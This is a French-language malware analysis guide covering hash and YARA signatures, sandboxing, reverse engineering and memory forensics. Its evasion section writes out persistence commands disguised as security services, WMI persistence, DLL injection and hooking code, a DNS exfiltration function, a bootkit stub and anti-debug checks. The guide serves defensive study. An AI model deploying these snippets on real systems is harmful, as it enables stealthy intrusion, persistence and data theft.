# Détection et Analyse de Malwares

## Détection et Analyse de Malwares - Identification des menaces

### Vue d'ensemble de l'analyse de malwares

L'analyse de malwares est un processus systématique d'examen des logiciels malveillants pour comprendre leurs fonctionnalités, leur comportement et leurs mécanismes d'infection.

#### Types d'analyse

**Analyse statique**
- Examen du code sans exécution
- Analyse des imports/exports
- Détection de packers/crypters
- Analyse des strings

**Analyse dynamique**
- Exécution en environnement contrôlé
- Monitoring du comportement
- Analyse des modifications système
- Monitoring réseau

**Analyse hybride**
- Combinaison des deux approches
- Corrélation des résultats
- Analyse approfondie

### Signatures et heuristiques

#### Signatures basées sur les hashes

**MD5/SHA1/SHA256**
```bash
# Calcul des hashes
md5sum malware.exe
sha1sum malware.exe
sha256sum malware.exe

# Vérification base de données
python virustotal_check.py --hash a1b2c3d4e5f6...
```

**Hashes fuzzy (ssdeep)**
```bash
# Calcul ssdeep
ssdeep malware.exe

# Comparaison avec base de données
ssdeep -m database.txt malware.exe
```

**Import Hash (imphash)**
```python
import pefile

pe = pefile.PE('malware.exe')
imphash = pe.get_imphash()
print(f"Import Hash: {imphash}")
```

#### Signatures YARA

**Règle basique**
```yara
rule Basic_Malware_Detection
{
    meta:
        description = "Détection de malware basique"
        author = "Analyst"
        date = "2024-01-15"
        
    strings:
        $api1 = "CreateRemoteThread"
        $api2 = "VirtualAllocEx"
        $api3 = "WriteProcessMemory"
        $string1 = "malware" nocase
        
    condition:
        all of ($api*) or $string1
}
```

**Règle avancée**
```yara
rule Advanced_Packer_Detection
{
    meta:
        description = "Détection de packer avancé"
        
    strings:
        $mz = { 4D 5A }
        $pe = { 50 45 00 00 }
        $upx1 = { 55 50 58 30 }
        $upx2 = { 55 50 58 31 }
        
    condition:
        $mz at 0 and $pe and any of ($upx*)
}
```

#### Heuristiques comportementales

**Techniques de détection**
- Analyse des API calls
- Monitoring des modifications système
- Détection d'injection de code
- Analyse des communications réseau

**Indicateurs comportementaux**
```python
# Pseudo-code d'analyse heuristique
def analyze_behavior(executable):
    score = 0
    
    # APIs suspectes
    if 'CreateRemoteThread' in executable.imports:
        score += 10
    if 'VirtualAllocEx' in executable.imports:
        score += 10
    if 'SetWindowsHookEx' in executable.imports:
        score += 8
        
    # Sections suspectes
    if executable.has_packed_sections():
        score += 15
        
    # Entropy élevée
    if executable.entropy > 7.5:
        score += 12
        
    return score
```

### Analyse comportementale

#### Sandbox automatisée

**Cuckoo Sandbox**
```bash
# Installation
git clone https://github.com/cuckoosandbox/cuckoo
cd cuckoo
pip install -r requirements.txt

# Configuration
cuckoo init
cuckoo community

# Soumission d'échantillon
cuckoo submit malware.exe
```

**Configuration Cuckoo**
```python
# cuckoo.conf
[cuckoo]
machinery = virtualbox
memory_dump = yes
terminate_processes = yes
max_analysis_count = 0

[processing]
enable_screenshots = yes
enable_procmon = yes
enable_networkmon = yes
```

#### Analyse manuelle en VM

**Préparation de l'environnement**
```powershell
# Outils de monitoring
- Process Monitor (ProcMon)
- Process Explorer
- Wireshark
- Regshot
- API Monitor

# Snapshot avant analyse
VBoxManage snapshot "Analysis-VM" take "Clean-State"
```

**Procédure d'analyse**
1. **Snapshot initial** de la VM
2. **Démarrage des outils** de monitoring
3. **Exécution** du malware
4. **Observation** du comportement
5. **Collecte** des artefacts
6. **Restauration** du snapshot

#### Monitoring système

**Process Monitor**
```
# Configuration des filtres
- Process and Thread Activity
- File and Directory Activity
- Registry Activity
- Network Activity
```

**Registry monitoring**
```powershell
# Avant exécution
reg export HKLM\SOFTWARE before_software.reg
reg export HKLM\SYSTEM before_system.reg

# Après exécution
reg export HKLM\SOFTWARE after_software.reg
reg export HKLM\SYSTEM after_system.reg

# Comparaison
fc before_software.reg after_software.reg > registry_changes.txt
```

### Reverse engineering de base

#### Analyse statique

**Outils principaux**
- **IDA Pro** : Désassembleur professionnel
- **Ghidra** : Outil NSA open source
- **x64dbg** : Débogueur Windows
- **PE-bear** : Analyseur PE

**Analyse PE**
```python
import pefile

pe = pefile.PE('malware.exe')

# Informations de base
print(f"Entry Point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:x}")
print(f"Image Base: 0x{pe.OPTIONAL_HEADER.ImageBase:x}")
print(f"Sections: {pe.FILE_HEADER.NumberOfSections}")

# Imports
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        print(f"  {imp.name.decode()}")

# Strings
strings = pe.get_strings()
for s in strings:
    if len(s) > 4:
        print(s)
```

#### Analyse dynamique

**Débogage avec x64dbg**
```assembly
# Points d'arrêt sur APIs critiques
bp CreateProcess
bp RegSetValue
bp CreateFile
bp InternetOpen

# Analyse du flux d'exécution
F9  # Run
F8  # Step Over
F7  # Step Into
```

**API Hooking**
```python
# Detours API Hooking
import detours

def hooked_createfile(filename, access, share, security, creation, flags, template):
    print(f"CreateFile called: {filename}")
    return original_createfile(filename, access, share, security, creation, flags, template)

detours.hook("kernel32.dll", "CreateFileW", hooked_createfile)
```

### Outils d'analyse statique et dynamique

#### Analyse statique

**PEiD**
```
# Détection de packers
PEiD.exe malware.exe

# Signatures communes
- UPX
- ASPack
- Themida
- VMProtect
```

**Strings analysis**
```bash
# Extraction des strings
strings malware.exe > strings.txt

# Filtrage des URLs
grep -i "http" strings.txt

# Filtrage des IPs
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" strings.txt

# Filtrage des registry keys
grep -i "hklm\|hkcu" strings.txt
```

**Entropy analysis**
```python
import math
from collections import Counter

def calculate_entropy(data):
    counter = Counter(data)
    length = len(data)
    entropy = 0
    
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    
    return entropy

# Calcul de l'entropie par section
for section in pe.sections:
    entropy = calculate_entropy(section.get_data())
    print(f"Section {section.Name.decode()}: {entropy:.2f}")
```

#### Analyse dynamique

**Wireshark**
```
# Filtres pour analyse malware
ip.addr == 192.168.1.100  # IP de la VM
http.request.method == POST
dns.qry.name contains "malware"
tcp.port == 80 or tcp.port == 443
```

**Volatility**
```bash
# Analyse mémoire
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 malfind
volatility -f memory.dump --profile=Win10x64 hollowfind
```

**Sysinternals Suite**
```powershell
# Process Explorer
procexp.exe

# Autoruns
autorunsc.exe -a > autoruns.txt

# TCPView
tcpview.exe

# Handle
handle.exe -p malware.exe
```

## Persistance et Steganographie - Techniques d'évasion

### Mécanismes de persistence Windows

#### Registre Windows

**Clés de démarrage automatique**
```registry
# Current User
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

# Local Machine
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

**Exemple d'installation**
```powershell
# Ajout d'une entrée de persistance
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\malware.exe" /f

# Vérification
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### Services Windows

**Création de service**
```powershell
# Création d'un service persistant
sc create "WindowsSecurityService" binpath= "C:\Windows\System32\malware.exe" start= auto displayname= "Windows Security Service"

# Démarrage du service
sc start "WindowsSecurityService"

# Modification d'un service existant
sc config "Spooler" binpath= "C:\Windows\System32\malware.exe"
```

**Analyse des services**
```powershell
# Liste des services
sc query type= service state= all

# Détail d'un service
sc qc "WindowsSecurityService"

# Vérification des binaires
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike "*system32*"} | Select-Object Name, PathName
```

#### Scheduled Tasks

**Création de tâches**
```powershell
# Tâche simple
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc daily /st 09:00

# Tâche avancée avec XML
schtasks /create /tn "SecurityCheck" /xml task.xml
```

**Fichier XML de tâche**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\Windows\Temp\malware.exe</Command>
    </Exec>
  </Actions>
</Task>
```

#### WMI Event Consumers

**Persistance via WMI**
```powershell
# Event Filter
$filterName = "ProcessStartFilter"
$query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
$filterClass = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filterClass.QueryLanguage = "WQL"
$filterClass.Query = $query
$filterClass.Name = $filterName
$filterClass.Put()

# Event Consumer
$consumerName = "MalwareConsumer"
$consumerClass = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumerClass.Name = $consumerName
$consumerClass.CommandLineTemplate = "C:\Windows\Temp\malware.exe"
$consumerClass.Put()

# Binding
$bindingClass = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$bindingClass.Filter = $filterClass
$bindingClass.Consumer = $consumerClass
$bindingClass.Put()
```

### Techniques de steganographie

#### Steganographie dans les fichiers

**Images (LSB)**
```python
from PIL import Image

def hide_data_in_image(image_path, data, output_path):
    img = Image.open(image_path)
    binary_data = ''.join(format(ord(char), '08b') for char in data)
    
    pixels = list(img.getdata())
    data_index = 0
    
    for i in range(len(pixels)):
        if data_index < len(binary_data):
            pixel = list(pixels[i])
            # Modifier le LSB du canal rouge
            pixel[0] = (pixel[0] & 0xFE) | int(binary_data[data_index])
            pixels[i] = tuple(pixel)
            data_index += 1
    
    img.putdata(pixels)
    img.save(output_path)
```

**Alternate Data Streams (ADS)**
```powershell
# Création d'ADS
echo "malware code" > innocent.txt:hidden.exe

# Exécution depuis ADS
wmic process call create "C:\path\innocent.txt:hidden.exe"

# Détection ADS
dir /r C:\path\
```

#### Steganographie réseau

**Covert channels**
```python
# DNS tunneling
import dns.resolver

def dns_exfiltrate(data, domain):
    subdomain = data.encode('hex')
    query = f"{subdomain}.{domain}"
    dns.resolver.query(query, 'A')

# ICMP tunneling
def icmp_tunnel(data):
    packet = IP(dst="target.com")/ICMP()/data
    send(packet)
```

### Rootkits et bootkits

#### Rootkits utilisateur

**DLL Injection**
```c
// Injection de DLL
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pRemoteMemory, dll_path, strlen(dll_path), NULL);

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
    (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
```

**API Hooking**
```c
// Hook de fonction
BYTE original_bytes[5];
DWORD old_protect;

// Sauvegarder les bytes originaux
ReadProcessMemory(GetCurrentProcess(), target_function, original_bytes, 5, NULL);

// Préparer le hook
BYTE hook_bytes[5] = {0xE9}; // JMP instruction
DWORD relative_address = (DWORD)hook_function - (DWORD)target_function - 5;
memcpy(hook_bytes + 1, &relative_address, 4);

// Installer le hook
VirtualProtect(target_function, 5, PAGE_EXECUTE_READWRITE, &old_protect);
WriteProcessMemory(GetCurrentProcess(), target_function, hook_bytes, 5, NULL);
VirtualProtect(target_function, 5, old_protect, &old_protect);
```

#### Rootkits kernel

**SSDT Hooking**
```c
// Hook de la System Service Descriptor Table
ULONG old_NtCreateFile = KeServiceDescriptorTable.ServiceTableBase[0x52];
KeServiceDescriptorTable.ServiceTableBase[0x52] = (ULONG)hooked_NtCreateFile;

NTSTATUS hooked_NtCreateFile(/* parameters */) {
    // Logique de hook
    return original_NtCreateFile(/* parameters */);
}
```

#### Bootkits

**Master Boot Record (MBR)**
```assembly
; Bootkit MBR
org 0x7C00

; Sauvegarder le MBR original
mov si, 0x7C00
mov di, 0x7E00
mov cx, 0x200
rep movsb

; Installer le hook
; ... code d'installation

; Charger le système d'exploitation
jmp 0x7E00
```

### Techniques anti-forensiques

#### Obfuscation

**Packers**
```
- UPX: Compresseur standard
- ASPack: Packer commercial
- Themida: Protection avancée
- VMProtect: Virtualisation de code
```

**Détection de packers**
```python
import pefile

def detect_packer(pe_file):
    pe = pefile.PE(pe_file)
    
    # Vérifier l'entropie des sections
    for section in pe.sections:
        entropy = calculate_entropy(section.get_data())
        if entropy > 7.5:
            return "Possibly packed"
    
    # Vérifier les signatures
    if b"UPX" in pe.__data__:
        return "UPX packed"
    
    return "Not packed"
```

#### Anti-debugging

**Techniques de détection**
```c
// IsDebuggerPresent
if (IsDebuggerPresent()) {
    ExitProcess(0);
}

// PEB check
PPEB peb = (PPEB)__readgsqword(0x60);
if (peb->BeingDebugged) {
    ExitProcess(0);
}

// Timing check
DWORD start = GetTickCount();
// Code à protéger
DWORD end = GetTickCount();
if (end - start > threshold) {
    ExitProcess(0);
}
```

#### Anti-VM

**Détection de virtualisation**
```c
// VMware detection
HKEY hKey;
if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    ExitProcess(0);
}

// CPU check
int cpuinfo[4];
__cpuid(cpuinfo, 1);
if (cpuinfo[2] & 0x80000000) { // Hypervisor present bit
    ExitProcess(0);
}
```

## Détection et analyse des techniques

### Outils de détection

**Volatility plugins**
```bash
# Détection de hooks
volatility -f memory.dump --profile=Win10x64 apihooks

# Détection de rootkits
volatility -f memory.dump --profile=Win10x64 ssdt

# Détection de processus cachés
volatility -f memory.dump --profile=Win10x64 psxview
```

**YARA rules pour rootkits**
```yara
rule Rootkit_Detection
{
    strings:
        $api1 = "ZwSetSystemInformation"
        $api2 = "KeServiceDescriptorTable"
        $api3 = "PsSetCreateProcessNotifyRoutine"
        
    condition:
        any of them
}
```

Cette approche méthodique permet une analyse complète des malwares et de leurs techniques d'évasion.